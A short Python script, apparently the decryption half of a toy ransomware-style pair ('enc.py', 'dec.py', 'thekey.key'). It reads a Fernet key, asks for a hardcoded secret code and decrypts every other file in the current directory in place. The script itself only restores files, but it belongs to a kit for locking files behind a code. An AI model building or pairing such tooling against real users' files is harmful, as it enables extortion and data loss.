import os
from cryptography.fernet import Fernet

files = []

# Collecting all files except specific ones
for file in os.listdir():
    if file == "enc.py" or file == "thekey.key" or file == "dec.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Files to decrypt:", files)

try:
    # Load the encryption key
    with open("thekey.key", "rb") as key:
        skey = key.read()

    # Secret phase prompt
    secretphase = "@134"
    userphase = input("Enter the secret code:\n")

    # Check user input
    if userphase == secretphase:
        for file in files:
            try:
                # Read encrypted file content
                with open(file, "rb") as thefile:
                    contents = thefile.read()

                # Decrypt file content
                contents_decrypted = Fernet(skey).decrypt(contents)

                # Write decrypted content back to the file
                with open(file, "wb") as thefile:
                    thefile.write(contents_decrypted)

                print(f"File '{file}' decrypted successfully.")

            except Exception as e:
                print(f"Error processing file '{file}': {e}")
    else:
        print("Incorrect secret code. Access denied.")

except Exception as e:
    print(f"An error occurred: {e}")
